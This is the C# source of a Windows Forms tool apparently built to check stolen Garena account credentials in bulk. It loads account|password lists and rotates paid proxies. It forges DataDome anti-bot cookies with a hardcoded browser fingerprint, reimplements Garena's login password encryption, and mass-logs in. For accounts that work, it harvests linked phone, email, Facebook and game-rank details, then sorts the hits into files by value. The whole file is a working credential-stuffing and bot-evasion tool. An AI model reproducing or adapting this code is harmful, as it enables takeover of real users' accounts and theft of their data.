using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using xNet;

namespace CheckInfoGas
{
    public partial class Form1 : Form
    {
        private System.Timers.Timer timer;
        List<Task> tasks { get; set; }
        string[] Accounts { get; set; }
        public Form1(string permission)
        {
            this.Permission = permission;
            InitializeComponent();
            SetPermission();
            tasks = new List<Task>();
        }

        CancellationTokenSource CancellationTokenSource;
        private string Proxy { get; set; }
        private string ApiKey { get; set; }
        private string Proxy2 { get; set; } = "";
        private string Permission { get; set; }

        void SetPermission()
        {
            switch (Permission)
            {
                case "Full":
                    cbInfo.Enabled = true;
                    cbLQ.Enabled = true;
                    break;
                case "Info":
                    cbInfo.Enabled = true;
                    cbLQ.Enabled = false;
                    break;
                case "LQ":
                    cbInfo.Enabled = false;
                    cbLQ.Enabled = true;
                    break;
                default:
                    cbInfo.Enabled = false;
                    cbLQ.Enabled = false;
                    break;
            }
        }
        private void btnStart_Click(object sender, EventArgs e)
        {
            if (btnStart.Text == "Start")
            {
                if (cbProxy.Checked)
                {
                    ApiKey = tbApiKey.Text;
                    GetNewProxy(null, null);
                    timer = new System.Timers.Timer(TimeSpan.FromMinutes(30).TotalMilliseconds);
                    timer.Elapsed += GetNewProxy;
                    timer.Start();
                }
                btnStart.Text = "Stop";
                var proxy = tbProxy.Text;

                CancellationTokenSource = new CancellationTokenSource();
                if (!string.IsNullOrEmpty(FilePath) && !string.IsNullOrEmpty(proxy))
                {
                    Proxy = proxy;
                    int maxThread = (int)numThread.Value;
                    Check(maxThread);
                }
                else if (string.IsNullOrEmpty(FilePath))
                {
                    MessageBox.Show("Chưa chọn file account", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnStart.Text = "Start";
                }
                else
                {
                    MessageBox.Show("Chưa nhập proxy bypass", "Cảnh báo!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnStart.Text = "Start";
                }
            }
            else
            {
                btnStart.Text = "Start";
                CancellationTokenSource.Cancel();
            }
        }

        private async void Check(int maxThread)
        {
            await Task.Run(async () =>
            {
                var semaphore = new SemaphoreSlim(maxThread, (maxThread * 2));
                foreach (var line in Accounts)
                {
                    if (CancellationTokenSource.IsCancellationRequested)
                        break;

                    var dataRaw = line.Split('|');

                    var account = dataRaw[0].Trim();
                    var password = dataRaw[1].Trim();
                    int add = 0;
                    dgv.Invoke(new Action(() =>
                    {
                        add = dgv.Rows.Add(dgv.Rows.Count, account, password, "Running");
                    }));
                    DataGridViewRow row = dgv.Rows[add];
                    await semaphore.WaitAsync();
                    tasks.Add(Task.Run(async () =>
                    {
                        try
                        {
                            await CheckPerThread(row, account, password);
                        }
                        finally
                        {
                            semaphore.Release();
                        }
                    }));
                }
                await Task.WhenAll(tasks);
                MessageBox.Show("Xong");
            });


        }

        private async Task CheckPerThread(DataGridViewRow row, string account, string password)
        {
            bool isSuccess = false;
            while (!isSuccess)
            {
                try
                {
                    var http = new HttpRequest
                    {
                        Cookies = new CookieDictionary(),
                    };

                    int i = 3; string v1 = string.Empty; string v2 = string.Empty;
                    SetStatusDataGridView(row, "Get V1, v2");
                    while (i > 0)
                    {
                        (v1, v2) = GetDataHashPassword(account);

                        if (!string.IsNullOrEmpty(v1) && !string.IsNullOrEmpty(v2) && !v1.Equals("error_no_account"))
                        {
                            // Continue with the rest of the code
                            break;
                        }
                        i--;
                    }

                    if (string.IsNullOrEmpty(v1) || string.IsNullOrEmpty(v2) || v1.Equals("error_no_account"))
                    {
                        SetStatusDataGridView(row, "V1, v2 is null");
                        break;
                    }

                    //var headers = new Dictionary<string, string>
                    //    {
                    //        {"Accept", "application/json, text/plain, */*"},
                    //        {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
                    //        {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + GetDataDome()},
                    //        {"Sec-Fetch-Dest", "empty"},
                    //        {"Sec-Fetch-Mode", "cors"},
                    //        {"Sec-Fetch-Site", "same-origin"},
                    //        {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
                    //        {"sec-ch-ua-mobile", "?1"},
                    //        {"sec-ch-ua-platform", "\"Android\""},
                    //        {"x-datadome-clientid", GetDataDome()}
                    //    };
                    //foreach (var header in headers)
                    //{
                    //    http.AddHeader(header.Key, header.Value);
                    //}

                    string encryptedPass = MaHoaPassGarena(
                        MD5Hash(password),
                        SHA256Hash(SHA256Hash(MD5Hash(password) + v1) + v2)
                    );

                    long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;

                    var response = http.Get($"https://sso.garena.com/api/login?account={account}&password={encryptedPass}&format=json&id={id}&app_id=10043").ToString();

                    if (string.IsNullOrEmpty(response))
                    {
                        SetStatusDataGridView(row, "Không có data");
                        return;
                    }

                    if (response.Contains("error_user_ban"))
                    {
                        SetStatusDataGridView(row, "Ban Account");
                        await WriteToFileAsync("Ban.txt", $"{account}|{password}");
                    }
                    else if (response.Contains("error_auth"))
                    {
                        SetStatusDataGridView(row, "Wrong password");
                        await WriteToFileAsync("WrongPass.txt", $"{account}|{password}");
                    }
                    else if (response.Contains("error_suspicious_ip"))
                    {
                        SetStatusDataGridView(row, "Spam ip");
                    }
                    else if (!response.Contains("error"))
                    {
                        var dataObject = JObject.Parse(response);
                        if (dataObject.ContainsKey("session_key"))
                        {
                            var sessionKey = dataObject["session_key"].ToString();

                            SetStatusDataGridView(row, "Login Success");
                            var status = string.Empty;
                            var fileName = string.Empty;

                            if (cbInfo.Checked)
                            {
                                var cookies = http.Cookies.ToDictionary(x => x.Key, x => x.Value);

                                var (infoStatus, mailStatus, fbStatus, idCard) = CheckInfoAccount(cookies, Proxy2);

                                switch (infoStatus)
                                {
                                    case "User info does not exist or is null":

                                        SetStatusDataGridView(row, infoStatus);
                                        break;
                                    case "Error_Mail":
                                        status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
                                        break;
                                    case "TTT":
                                        status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
                                        break;
                                    case "FullTT":
                                        status = $"{idCard}|{mailStatus}|{fbStatus}|{infoStatus}";
                                        break;
                                }

                                fileName = infoStatus;

                                if (string.IsNullOrEmpty(status))
                                    return;
                            }

                            if (cbLQ.Checked)
                            {
                                var (hero, level, rank, name) = CheckLienQuan(sessionKey);

                                if (!cbInfo.Checked)
                                {
                                    fileName = string.IsNullOrEmpty(hero) ? "LienQuanFail" : "LienQuanSuccess";

                                    status = string.IsNullOrEmpty(hero) ? "Don't Have Account" : $"{hero}|{level}|{rank}|{name}";
                                }
                                else
                                {
                                    status = string.IsNullOrEmpty(hero) ? status + "|Don't Have Account" : $"{status}|{hero}|{level}|{rank}|{name}";

                                    if (status.Split('|')[3] == "FullTT" && !string.IsNullOrEmpty(hero))
                                    {
                                        if (hero.Length > 1)
                                        {
                                            var typeAccount = hero.Substring(0, 1) == "K" ? "KDX" : hero.Substring(0, 1) + "x";
                                            await WriteToFileAsync($@"{Application.StartupPath}Lienquan\\LienQuan{typeAccount}.txt", $"{account}|{password}|{status}");
                                        }
                                    }
                                }

                                if (status.Contains("Don't Have Account"))
                                {
                                    fileName = "NoAccount";
                                }
                            }

                            if (!cbLQ.Checked && !cbInfo.Checked)
                            {
                                await WriteToFileAsync("Success.txt", $"{account}|{password}");
                            }
                            else
                            {
                                SetStatusDataGridView(row, status);

                                await WriteToFileAsync($"{fileName}.txt", $"{account}|{password}|{status}");
                            }
                        }
                        else
                        {
                            SetStatusDataGridView(row, "Không có session key");
                        }
                    }
                    else
                    {
                        SetStatusDataGridView(row, response);
                    }

                    isSuccess = true;
                }
                catch (Exception ex)
                {
                    SetStatusDataGridView(row, ex.Message);
                }
            }
        }

        private void SetStatusDataGridView(DataGridViewRow row, string status)
        {
            dgv.Invoke(new Action(() =>
            {
                row.Cells["cStatus"].Value = status;
            }));
        }

        private async Task WriteToFileAsync(string fileName, string content)
        {
            bool isSuccess = false;
            while (!isSuccess)
            {
                try
                {
                    using (var sw = new StreamWriter(fileName, true))
                    {
                        await sw.WriteLineAsync(content);
                    }
                    isSuccess = true;
                }
                catch
                {
                    await Task.Delay(100);
                }
            }
        }

        private (string, string, string, string) CheckLienQuan(string sessionKey)
        {
            var http = new HttpRequest()
            {
                Cookies = new CookieDictionary(),
                SslCertificateValidatorCallback = (sender, cert, chain, sslPolicyErrors) => true,
            };

            http.Cookies.Add("session_key", sessionKey);

            var response = http.Post("https://pvp.garena.vn/api/summoner/profile/", "{}", "application/json").ToString();
            var hero = string.Empty;
            var responseObject = JObject.Parse(response);
            if (responseObject.ContainsKey("summoner_info"))
            {

                if (response.Contains("champion_cnt"))
                {
                    hero = responseObject["summoner_info"]["champion_cnt"].ToString();
                    if (hero == "10")
                    {
                        hero = "KXD";
                    }
                }
                var levelGame = responseObject["summoner_info"]["pvp_level"].ToString();
                var nameIG = responseObject["summoner_info"]["name"].ToString();
                var rankGame = responseObject["summoner_info"]["ladder_grade"].ToString().Substring(0, 1) ?? string.Empty;
                var rankInfo = string.Empty;
                switch (rankGame)
                {
                    case "1":
                        rankInfo = "Brown";
                        break;
                    case "2":
                        rankInfo = "Silver";
                        break;
                    case "3":
                        rankInfo = "Gold";
                        break;
                    case "4":
                        rankInfo = "Platinum";
                        break;
                    case "5":
                        rankInfo = "Diamond";
                        break;
                    case "6":
                        rankInfo = "Master";
                        break;
                    case "8":
                        rankInfo = "TA";
                        break;
                    default:
                        rankInfo = "NO RANK";
                        break;
                }

                return (hero, levelGame, rankInfo, nameIG);
            }

            return ("", "", "", "");
        }

        private (string, string, string, string) CheckInfoAccount(Dictionary<string, string> cookies, string proxy)
        {
            using (var http = new HttpRequest())
            {
                http.Cookies = new CookieDictionary();
                foreach (var cookie in cookies)
                {
                    try
                    {
                        http.Cookies.Add(cookie.Key, cookie.Value);
                    }
                    catch { }
                }
                http.Proxy = HttpProxyClient.Parse(proxy);
                var urlCheckInfo = "https://account.garena.com/api/account/init";
                var responseInfo = http.Get(urlCheckInfo).ToString();
                var initObject = JObject.Parse(responseInfo);
                if (initObject.ContainsKey("user_info"))
                {
                    var infoStatus = string.Empty;
                    var phoneNumber = initObject["user_info"]["mobile_no"].ToString();
                    var checkPhone = phoneNumber.Contains("*") ? true : false;

                    var emailVerification = initObject["user_info"]["email_v"].ToString();
                    var checkEmail = emailVerification.Equals("0") ? false : true;

                    var checkFb = string.Empty;
                    var fbUid = Regex.Match(responseInfo, "fb_uid\":\"(.*?)\"").Groups[1].Value;
                    if (string.IsNullOrEmpty(fbUid))
                    {
                        checkFb = "NOT LK";
                    }
                    else
                    {
                        var fbStatus = CheckLiveFb(fbUid);
                        checkFb = fbStatus ? "Live" : "Die";
                    }

                    var checkIdCard = initObject.ContainsKey("idcard") ? true : false;

                    if (checkPhone == true)
                    {
                        infoStatus = "FullTT";
                    }
                    else if (checkEmail == true)
                    {
                        infoStatus = "Error_Mail";
                    }
                    else if (checkEmail == false && checkPhone == false)
                    {
                        infoStatus = "TTT";
                    }

                    return (infoStatus, checkEmail ? "Yes" : "No", checkFb, checkIdCard ? "Yes" : "No");
                }
                else
                {
                    return ("User info does not exist or is null", "", "", "");
                }
            }
        }

        private string MaHoaPassGarena(string plaintext, string key)
        {
            using (AesManaged aes = new AesManaged())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Mode = CipherMode.ECB;
                aes.Padding = PaddingMode.None;

                aes.Key = StringToByteArray(key.Substring(0, 64));

                var encryptor = aes.CreateEncryptor(aes.Key, null);

                byte[] plainTextBytes = HexStringToByteArray(plaintext);
                byte[] cipherTextBytes = encryptor.TransformFinalBlock(plainTextBytes, 0, plainTextBytes.Length);

                return ByteArrayToString(cipherTextBytes).Substring(0, 32);
            }
        }

        private string MD5Hash(string input)
        {
            using (MD5 md5 = MD5.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = md5.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string SHA256Hash(string input)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] inputBytes = Encoding.ASCII.GetBytes(input);
                byte[] hashBytes = sha256.ComputeHash(inputBytes);

                return ByteArrayToString(hashBytes);
            }
        }

        private string ByteArrayToString(byte[] ba)
        {
            StringBuilder hex = new StringBuilder(ba.Length * 2);
            foreach (byte b in ba)
                hex.AppendFormat("{0:x2}", b);
            return hex.ToString();
        }

        private byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        // Thêm hàm này để chuyển đổi chuỗi Hex thành mảng byte
        private byte[] HexStringToByteArray(string hex)
        {
            int NumberChars = hex.Length / 2;
            byte[] bytes = new byte[NumberChars];
            using (var sr = new System.IO.StringReader(hex))
            {
                for (int i = 0; i < NumberChars; i++)
                    bytes[i] = Convert.ToByte(new string(new char[2] { (char)sr.Read(), (char)sr.Read() }), 16);
            }
            return bytes;
        }

        private bool CheckLiveFb(string uid)
        {
            try
            {
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                };
                var response = http.Get($"https://graph.facebook.com/{uid}/picture?type=normal&redirect=false").ToString();
                if (response.Contains("height") || response.Contains("width"))
                    return true;

                return false;
            }
            catch
            {
                return false;
            }
        }

        private (string, string) GetDataHashPassword(string account)
        {
            try
            {
                var proxyRaw = Proxy.Split(':');
                var http = new HttpRequest
                {
                    Cookies = new CookieDictionary(),
                    Proxy = HttpProxyClient.Parse($"{proxyRaw[0]}:{proxyRaw[1]}"),
                    KeepAlive = true,
                    EnableEncodingContent = true,
                    UserAgent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
                    Referer = "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"
                };
                http.Proxy.Username = proxyRaw[2];
                http.Proxy.Password = proxyRaw[3];
                long id = DateTimeOffset.Now.ToUnixTimeMilliseconds() / 1000;
                var dataDome = GetDataDome();
                var headers = new Dictionary<string, string>
                {
                    {"Accept", "application/json, text/plain, */*"},
                    //{"Accept-Encoding", "gzip, deflate, br"},
                    {"Accept-Language", "vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"},
                    //{"Connection", "keep-alive"},
                    {"Cookie", "_ga=GA1.1.1629491323.1706450848; token_session=c17e119c61460aab0b4a2024157a11b244f5430627c9566b0a8f702adb5f573a3edc9cb577dc1f4dbbe5f948e18d8c6e; _ga_1M7M9L6VPX=GS1.1.1708017064.12.1.1708017065.0.0.0; datadome=" + dataDome},
                    //{"Host", "sso.garena.com"},
                    //{"Referer", "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=vi-VN"},
                    {"Sec-Fetch-Dest", "empty"},
                    {"Sec-Fetch-Mode", "cors"},
                    {"Sec-Fetch-Site", "same-origin"},
                    //{"User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36"},
                    {"sec-ch-ua", "\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\""},
                    {"sec-ch-ua-mobile", "?1"},
                    {"sec-ch-ua-platform", "\"Android\""},
                    {"x-datadome-clientid", dataDome}
                };
                foreach (var header in headers)
                {
                    if (header.Key.Equals("Cookie"))
                    {
                        var cookieJar = header.Value.Split(';');
                        foreach (var cookie in cookieJar)
                        {
                            var cookieTemp = cookie.Split('=');
                            try
                            {
                                http.Cookies.Add(cookieTemp[0], cookieTemp[1]);
                            }
                            catch { }
                        }
                    }
                    else
                    {
                        http.AddHeader(header.Key, header.Value);
                    }
                }

                var response = http.Get($"https://sso.garena.com/api/prelogin?account={account}&format=json&id={id}&app_id=10043").ToString();
                if (response.Contains("error_no_account"))
                    return ("error_no_account", "");
                var v1 = JObject.Parse(response)["v1"].ToString();
                var v2 = JObject.Parse(response)["v2"].ToString();

                return (v1, v2);
            }
            catch
            {
                return ("", "");
            }
        }

        private void GetNewProxy(object sender, ElapsedEventArgs e)
        {
            try
            {
                string text = "string";
                var jsonObject = new
                {
                    api_key = ApiKey,
                    sign = "string",
                    id_location = 1,
                };
                string param = string.Concat(new string[]
                {
                    "{\"api_key\": \"",
                    ApiKey,
                    "\",\"sign\": \"",
                    text,
                    "\",\"id_location\": 1",
                    "}",
                });
                string response = this.RequestPost("https://tmproxy.com/api/proxy/get-new-proxy", param);
                if (!string.IsNullOrEmpty(response))
                {
                    var jObject = JObject.Parse(response);
                    if (jObject["code"].ToString() == "0")
                    {
                        Proxy2 = jObject["data"]["https"].ToString();
                        if (Proxy2 == "")
                        {
                            Proxy2 = GetCurrentProxy(ApiKey);
                        }
                    }
                    else if (jObject["code"].ToString() == "5")
                    {
                        Proxy2 = GetCurrentProxy(ApiKey);
                    }
                }
            }
            catch { }
        }

        public string GetCurrentProxy(string ApiKey)
        {
            string param = string.Concat(new string[]
            {
                "{\"api_key\": \"",
                ApiKey,
                "\"}"
            });
            string text2 = this.RequestPost("https://tmproxy.com/api/proxy/get-current-proxy", param);
            JObject jobject = JObject.Parse(text2);
            string value2 = Regex.Match(JObject.Parse(text2)["message"].ToString(), "\\d+").Value;
            var Proxy = jobject["data"]["https"].ToString();
            return Proxy;
        }

        private string RequestPost(string Param944, string Param945)
        {
            string text = "";

            System.Net.WebClient webClient = new WebClient();
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            webClient.Headers[HttpRequestHeader.ContentType] = "application/json";
            text = webClient.UploadString(Param944, Param945);
            if (string.IsNullOrEmpty(text))
            {
                text = "";
            }

            return text;
        }

        private string GetDataDome()
        {
            HttpRequest http = new HttpRequest
            {
                Cookies = new CookieDictionary(),
            };

            var dataPost = "jsData={\"ttst\":34.500000178813934,\"ifov\":false,\"wdifrm\":false,\"wdif\":false,\"br_h\":844,\"br_w\":390,\"br_oh\":844,\"br_ow\":390,\"nddc\":1,\"rs_h\":844,\"rs_w\":390,\"rs_cd\":24,\"phe\":false,\"nm\":false,\"jsf\":false,\"ua\":\"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1\",\"lg\":\"vi\",\"pr\":3,\"hc\":4,\"ars_h\":844,\"ars_w\":390,\"tz\":-420,\"str_ss\":true,\"str_ls\":true,\"str_idb\":true,\"str_odb\":true,\"plgod\":false,\"plg\":0,\"plgne\":\"NA\",\"plgre\":\"NA\",\"plgof\":\"NA\",\"plggt\":\"NA\",\"pltod\":false,\"hcovdr\":false,\"hcovdr2\":false,\"plovdr\":false,\"plovdr2\":false,\"ftsovdr\":false,\"ftsovdr2\":false,\"lb\":true,\"eva\":33,\"lo\":true,\"ts_mtp\":1,\"ts_tec\":true,\"ts_tsa\":true,\"vnd\":\"Google Inc.\",\"bid\":\"NA\",\"mmt\":\"empty\",\"plu\":\"empty\",\"hdn\":false,\"awe\":false,\"geb\":false,\"dat\":false,\"med\":\"defined\",\"aco\":\"probably\",\"acots\":false,\"acmp\":\"probably\",\"acmpts\":true,\"acw\":\"probably\",\"acwts\":false,\"acma\":\"maybe\",\"acmats\":false,\"acaa\":\"probably\",\"acaats\":true,\"ac3\":\"\",\"ac3ts\":false,\"acf\":\"probably\",\"acfts\":false,\"acmp4\":\"maybe\",\"acmp4ts\":false,\"acmp3\":\"probably\",\"acmp3ts\":false,\"acwm\":\"maybe\",\"acwmts\":false,\"ocpt\":false,\"vco\":\"probably\",\"vcots\":false,\"vch\":\"probably\",\"vchts\":true,\"vcw\":\"probably\",\"vcwts\":true,\"vc3\":\"maybe\",\"vc3ts\":false,\"vcmp\":\"\",\"vcmpts\":false,\"vcq\":\"\",\"vcqts\":false,\"vc1\":\"probably\",\"vc1ts\":true,\"dvm\":4,\"sqt\":false,\"so\":\"portrait-primary\",\"wbd\":false,\"wbdm\":true,\"wdw\":true,\"cokys\":\"bG9hZFRpbWVzY3NpYXBwcnVudGltZQ==L=\",\"ecpc\":false,\"lgs\":true,\"lgsod\":false,\"psn\":true,\"edp\":true,\"addt\":true,\"wsdc\":true,\"ccsr\":true,\"nuad\":true,\"bcda\":false,\"idn\":true,\"capi\":false,\"svde\":false,\"vpbq\":true,\"ucdv\":false,\"spwn\":false,\"emt\":false,\"bfr\":false,\"dbov\":false,\"npmtm\":false,\"jset\":1657013360}&events=[]&eventCounters=[]&jsType=ch&cid=.9Nfoi4MbtrhZ~-OzCe~9usp06_xKvitrfSO_5i8SbAvj_9hA-MnNwlaDhl4GxNX4oYEwpAo-KAriC6KcwwSwKfxI.I8_5UJuMtUXNzFVIbpOuMkCbT97yipJWa-gR3r&ddk=AE3F04AD3F0D3A462481A337485081&Referer=https%3A%2F%2Fsso.garena.com%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&request=%2Fui%2Flogin%3Fapp_id%3D10100%26redirect_uri%3Dhttps%253A%252F%252Faccount.garena.com%252F%26locale%3Dvi-VN&responsePage=origin&ddv=4.4.3";
            var response = http.Post("https://api-js.datadome.co/js/", dataPost, "application/x-www-form-urlencoded").ToString();
            var cookie = JObject.Parse(response)["cookie"].ToString();
            return Regex.Match(cookie, "datadome=(.*?);").Groups[1].Value;
        }

        private string FilePath;

        private async void importToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                FilePath = openFileDialog.FileName;
                var accounts2 = await File.ReadAllLinesAsync(FilePath);
                Accounts = accounts2.Where(x => !string.IsNullOrEmpty(x) && x.Split('|').Length > 2).ToArray();

                MessageBox.Show("Load Xong");
            }
            else
            {
                FilePath = string.Empty;
            }
        }

        private void cbProxy_CheckedChanged(object sender, EventArgs e)
        {

        }
    }
}
